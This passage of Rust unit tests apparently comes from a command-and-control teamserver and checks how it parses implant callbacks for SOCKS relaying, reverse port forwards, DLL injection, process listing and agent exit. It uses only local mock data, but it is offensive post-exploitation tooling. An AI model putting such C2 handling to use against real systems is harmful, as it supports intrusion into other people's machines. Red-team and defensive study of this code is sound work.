        add_bytes(&mut payload, b"hello");

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 27, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("socket relay delivery error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to deliver socks data for 85"));
        assert!(msg.contains("SOCKS5 client 0x00000055 not found"));
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_add_callback_broadcasts_success_and_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut success = Vec::new();
        add_u32(&mut success, u32::from(DemonSocketCommand::ReversePortForwardAdd));
        add_u32(&mut success, 1);
        add_u32(&mut success, 0x55);
        add_u32(&mut success, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut success, 4444);
        add_u32(&mut success, u32::from_le_bytes([10, 0, 0, 5]));
        add_u32(&mut success, 8080);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 28, &success)
            .await?;

        let success_event = receiver.recv().await.ok_or("missing rportfwd add success event")?;
        let OperatorMessage::AgentResponse(success_message) = success_event else {
            panic!("expected agent response event");
        };
        assert_eq!(success_message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            success_message.info.extra.get("Message"),
            Some(&Value::String(
                "Started reverse port forward on 127.0.0.1:4444 to 10.0.0.5:8080 [Id: 55]"
                    .to_owned(),
            ))
        );

        let mut failure = Vec::new();
        add_u32(&mut failure, u32::from(DemonSocketCommand::ReversePortForwardAdd));
        add_u32(&mut failure, 0);
        add_u32(&mut failure, 0x66);
        add_u32(&mut failure, u32::from_le_bytes([192, 168, 1, 10]));
        add_u32(&mut failure, 9001);
        add_u32(&mut failure, u32::from_le_bytes([172, 16, 1, 20]));
        add_u32(&mut failure, 22);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 29, &failure)
            .await?;

        let failure_event = receiver.recv().await.ok_or("missing rportfwd add failure event")?;
        let OperatorMessage::AgentResponse(failure_message) = failure_event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            failure_message.info.extra.get("Type"),
            Some(&Value::String("Error".to_owned()))
        );
        assert_eq!(
            failure_message.info.extra.get("Message"),
            Some(&Value::String(
                "Failed to start reverse port forward on 192.168.1.10:9001 to 172.16.1.20:22"
                    .to_owned(),
            ))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_list_callback_formats_output_rows()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::ReversePortForwardList));
        add_u32(&mut payload, 0x21);
        add_u32(&mut payload, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut payload, 8080);
        add_u32(&mut payload, u32::from_le_bytes([10, 0, 0, 8]));
        add_u32(&mut payload, 80);
        add_u32(&mut payload, 0x22);
        add_u32(&mut payload, u32::from_le_bytes([0, 0, 0, 0]));
        add_u32(&mut payload, 8443);
        add_u32(&mut payload, u32::from_le_bytes([192, 168, 56, 10]));
        add_u32(&mut payload, 443);

        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandSocket), 30, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing rportfwd list event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("reverse port forwards:".to_owned()))
        );
        assert!(message.info.output.contains("Socket ID"));
        assert!(message.info.output.contains("21           127.0.0.1:8080 -> 10.0.0.8:80"));
        assert!(message.info.output.contains("22           0.0.0.0:8443 -> 192.168.56.10:443"));
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_remove_callback_only_broadcasts_for_rportfwd_type()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::ReversePortForwardRemove));
        add_u32(&mut payload, 0x88);
        add_u32(&mut payload, u32::from(DemonSocketType::ReversePortForward));
        add_u32(&mut payload, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut payload, 7000);
        add_u32(&mut payload, u32::from_le_bytes([10, 10, 10, 10]));
        add_u32(&mut payload, 3389);

        dispatcher
            .dispatch(0xBEEF_CAFE, u32::from(DemonCommand::CommandSocket), 31, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing rportfwd remove event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Successful closed and removed rportfwd [SocketID: 88] [Forward: 127.0.0.1:7000 -> 10.10.10.10:3389]"
                    .to_owned(),
            ))
        );

        let mut other_type = Vec::new();
        add_u32(&mut other_type, u32::from(DemonSocketCommand::ReversePortForwardRemove));
        add_u32(&mut other_type, 0x99);
        add_u32(&mut other_type, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut other_type, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut other_type, 7001);
        add_u32(&mut other_type, u32::from_le_bytes([10, 10, 10, 11]));
        add_u32(&mut other_type, 3390);

        dispatcher
            .dispatch(0xBEEF_CAFE, u32::from(DemonCommand::CommandSocket), 32, &other_type)
            .await?;

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "non-rportfwd remove should not broadcast an event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_clear_callback_broadcasts_success_and_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut success = Vec::new();
        add_u32(&mut success, u32::from(DemonSocketCommand::ReversePortForwardClear));
        add_u32(&mut success, 1);
        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandSocket), 33, &success)
            .await?;

        let success_event = receiver.recv().await.ok_or("missing rportfwd clear success event")?;
        let OperatorMessage::AgentResponse(success_message) = success_event else {
            panic!("expected agent response event");
        };
        assert_eq!(success_message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        assert_eq!(
            success_message.info.extra.get("Message"),
            Some(&Value::String("Successful closed and removed all rportfwds".to_owned()))
        );

        let mut failure = Vec::new();
        add_u32(&mut failure, u32::from(DemonSocketCommand::ReversePortForwardClear));
        add_u32(&mut failure, 0);
        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandSocket), 34, &failure)
            .await?;

        let failure_event = receiver.recv().await.ok_or("missing rportfwd clear failure event")?;
        let OperatorMessage::AgentResponse(failure_message) = failure_event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            failure_message.info.extra.get("Type"),
            Some(&Value::String("Error".to_owned()))
        );
        assert_eq!(
            failure_message.info.extra.get("Message"),
            Some(&Value::String("Failed to closed and remove all rportfwds".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_write_callback_broadcasts_error_on_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::Write));
        add_u32(&mut payload, 0x44);
        add_u32(&mut payload, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 10061);

        dispatcher
            .dispatch(0xFACE_FEED, u32::from(DemonCommand::CommandSocket), 35, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing socket write failure event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to write to socks target 68: 10061".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_connect_and_close_callbacks_drive_socks_client_lifecycle()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0x1234_5678,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );

        let started = sockets.add_socks_server(0x1234_5678, "0").await?;
        let addr = started
            .split_whitespace()
            .last()
            .ok_or("SOCKS server address missing from start message")?;
        let mut client = TcpStream::connect(addr).await?;

        client.write_all(&[5, 1, 0]).await?;
        let mut negotiation = [0_u8; 2];
        client.read_exact(&mut negotiation).await?;
        assert_eq!(negotiation, [5, 0]);

        client.write_all(&[5, 1, 0, 1, 127, 0, 0, 1, 0x1F, 0x90]).await?;

        let socket_id = timeout(Duration::from_secs(5), async {
            loop {
                let queued = registry.queued_jobs(0x1234_5678).await?;
                if let Some(job) = queued.iter().find(|job| job.command_line == "socket connect") {
                    let socket_id =
                        u32::from_le_bytes(job.payload[4..8].try_into().map_err(|_| "socket id")?);
                    return Ok::<u32, Box<dyn std::error::Error>>(socket_id);
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .map_err(|_| {
            std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "timed out waiting for socket connect job to be queued",
            )
        })??;

        let mut connect = Vec::new();
        add_u32(&mut connect, u32::from(DemonSocketCommand::Connect));
        add_u32(&mut connect, 1);
        add_u32(&mut connect, socket_id);
        add_u32(&mut connect, 0);
        dispatcher
            .dispatch(0x1234_5678, u32::from(DemonCommand::CommandSocket), 36, &connect)
            .await?;

        let mut connect_reply = [0_u8; 10];
        client.read_exact(&mut connect_reply).await?;
        assert_eq!(connect_reply, [5, 0, 0, 1, 127, 0, 0, 1, 0x1F, 0x90]);

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonSocketCommand::Close));
        add_u32(&mut close, socket_id);
        add_u32(&mut close, u32::from(DemonSocketType::ReverseProxy));
        dispatcher
            .dispatch(0x1234_5678, u32::from(DemonCommand::CommandSocket), 37, &close)
            .await?;

        let mut eof = [0_u8; 1];
        let closed = timeout(Duration::from_secs(1), client.read(&mut eof)).await?;
        assert_eq!(closed?, 0);
        Ok(())
    }

    #[tokio::test]
    async fn socket_callback_rejects_unknown_subcommands() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let error = dispatcher
            .dispatch(
                0xDEAD_BEEF,
                u32::from(DemonCommand::CommandSocket),
                38,
                &0xFFFF_FFFF_u32.to_le_bytes(),
            )
            .await
            .expect_err("unknown socket subcommand should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, .. }
                if command_id == u32::from(DemonCommand::CommandSocket)
        ));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_modules_handler_broadcasts_module_list()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Modules));
        add_u32(&mut payload, 1234);
        add_bytes(&mut payload, b"ntdll.dll");
        add_u64(&mut payload, 0x7FFA_0000_0000);
        add_bytes(&mut payload, b"kernel32.dll");
        add_u64(&mut payload, 0x7FFA_1000_0000);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandProc), 10, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "modules response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process Modules (PID: 1234):".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        let rows = message
            .info
            .extra
            .get("ModuleRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured module rows missing".to_owned())?;
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].get("Name"), Some(&Value::String("ntdll.dll".to_owned())));
        assert_eq!(rows[0].get("Base"), Some(&Value::String("0x00007FFA00000000".to_owned())));
        assert_eq!(rows[1].get("Name"), Some(&Value::String("kernel32.dll".to_owned())));
        assert!(message.info.output.contains("ntdll.dll"));
        assert!(message.info.output.contains("kernel32.dll"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_grep_handler_broadcasts_matching_processes()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Grep));
        add_utf16(&mut payload, "svchost.exe");
        add_u32(&mut payload, 800);
        add_u32(&mut payload, 4);
        add_bytes(&mut payload, b"NT AUTHORITY\\SYSTEM");
        add_u32(&mut payload, 64);

        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandProc), 11, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "grep response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process Grep:".to_owned()))
        );
        let rows = message
            .info
            .extra
            .get("GrepRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured grep rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("Name"), Some(&Value::String("svchost.exe".to_owned())));
        assert_eq!(rows[0].get("PID"), Some(&Value::from(800)));
        assert_eq!(rows[0].get("PPID"), Some(&Value::from(4)));
        assert_eq!(rows[0].get("Arch"), Some(&Value::String("x64".to_owned())));
        assert!(message.info.output.contains("svchost.exe"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_memory_handler_broadcasts_memory_regions()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Memory));
        add_u32(&mut payload, 5678);
        add_u32(&mut payload, 0x40); // PAGE_EXECUTE_READWRITE
        add_u64(&mut payload, 0x0000_0140_0000_0000);
        add_u32(&mut payload, 0x1000);
        add_u32(&mut payload, 0x40); // PAGE_EXECUTE_READWRITE
        add_u32(&mut payload, 0x1000); // MEM_COMMIT
        add_u32(&mut payload, 0x1000000); // MEM_IMAGE

        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandProc), 12, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "memory response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|m| m.contains("PID: 5678"))
        );
        let rows = message
            .info
            .extra
            .get("MemoryRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured memory rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("Base"), Some(&Value::String("0x0000014000000000".to_owned())));
        assert_eq!(rows[0].get("Size"), Some(&Value::String("0x1000".to_owned())));
        assert_eq!(
            rows[0].get("Protect"),
            Some(&Value::String("PAGE_EXECUTE_READWRITE".to_owned()))
        );
        assert_eq!(rows[0].get("State"), Some(&Value::String("MEM_COMMIT".to_owned())));
        assert_eq!(rows[0].get("Type"), Some(&Value::String("MEM_IMAGE".to_owned())));
        assert!(message.info.output.contains("PAGE_EXECUTE_READWRITE"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_modules_handler_handles_empty_module_list()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Modules));
        add_u32(&mut payload, 9999);

        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandProc), 13, &payload)
            .await?;

        let event =
            receiver.recv().await.ok_or_else(|| "empty modules response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let rows = message
            .info
            .extra
            .get("ModuleRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "module rows should be present even if empty".to_owned())?;
        assert!(rows.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_success()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0001,
                u32::from(DemonCommand::CommandInjectDll),
                20,
                &u32::from(DemonInjectError::Success).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully injected DLL into remote process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_error() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0002,
                u32::from(DemonCommand::CommandInjectDll),
                21,
                &u32::from(DemonInjectError::Failed).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to inject DLL into remote process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_arch_mismatch()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0003,
                u32::from(DemonCommand::CommandInjectDll),
                22,
                &u32::from(DemonInjectError::ProcessArchMismatch).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll arch mismatch missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("DLL injection failed: process architecture mismatch".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_spawn_dll_handler_broadcasts_success() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0010,
                u32::from(DemonCommand::CommandSpawnDll),
                30,
                &u32::from(DemonInjectError::Success).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("spawn dll response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully spawned DLL in new process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_spawn_dll_handler_broadcasts_error() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0011,
                u32::from(DemonCommand::CommandSpawnDll),
                31,
                &u32::from(DemonInjectError::Failed).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("spawn dll error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to spawn DLL in new process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_exit_handler_marks_agent_dead_and_broadcasts_events()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0xAABB_CCDD,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );
        sockets.add_socks_server(0xAABB_CCDD, "0").await?;

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandExit), 40, &1_u32.to_le_bytes())
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("expected agent update event");
        };
        assert_eq!(message.info.agent_id, "AABBCCDD");
        assert_eq!(message.info.marked, "Dead");

        let event = receiver.recv().await.ok_or("agent response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Agent has been tasked to cleanup and exit thread. cya...".to_owned(),
            ))
        );

        let agent = registry.get(0xAABB_CCDD).await.ok_or("agent should remain tracked")?;
        assert!(!agent.active);
        assert_eq!(sockets.list_socks_servers(0xAABB_CCDD).await, "No active SOCKS5 servers");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_kill_date_handler_marks_agent_dead_and_broadcasts_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0x1020_3040,
                [0x42; AGENT_KEY_LENGTH],
                [0x25; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );
        sockets.add_socks_server(0x1020_3040, "0").await?;

        dispatcher.dispatch(0x1020_3040, u32::from(DemonCommand::CommandKillDate), 41, &[]).await?;

        let _ = receiver.recv().await.ok_or("agent update missing")?;
        let event = receiver.recv().await.ok_or("agent response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Agent has reached its kill date, tasked to cleanup and exit thread. cya..."
                    .to_owned(),
            ))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        assert_eq!(sockets.list_socks_servers(0x1020_3040).await, "No active SOCKS5 servers");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_demon_info_handler_formats_memory_and_process_messages()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonInfoClass::MemAlloc));
        add_u64(&mut payload, 0x1234_5000);
        add_u32(&mut payload, 4096);
        add_u32(&mut payload, 0x40);
        dispatcher.dispatch(0xDEAD_BEEF, u32::from(DemonCommand::DemonInfo), 42, &payload).await?;

        let event = receiver.recv().await.ok_or("mem alloc response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|value| value.contains("Memory Allocated"))
        );
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|value| value.contains("PAGE_EXECUTE_READWRITE"))
        );

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonInfoClass::ProcCreate));
        add_utf16(&mut payload, "C:\\Windows\\System32\\cmd.exe");
        add_u32(&mut payload, 777);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        dispatcher.dispatch(0xDEAD_BEEF, u32::from(DemonCommand::DemonInfo), 43, &payload).await?;

        let event = receiver.recv().await.ok_or("proc create response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.extra.get("Message").and_then(Value::as_str).is_some_and(|value| {
            value.contains("Process started: Path:[C:\\Windows\\System32\\cmd.exe]")
        }));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_command_error_handler_broadcasts_win32_and_token_messages()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallbackError::Win32));
        add_u32(&mut payload, 2);
        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandError), 44, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("win32 error response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Win32 Error: ERROR_FILE_NOT_FOUND [2]".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallbackError::Token));
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandError), 45, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token error response missing")?;
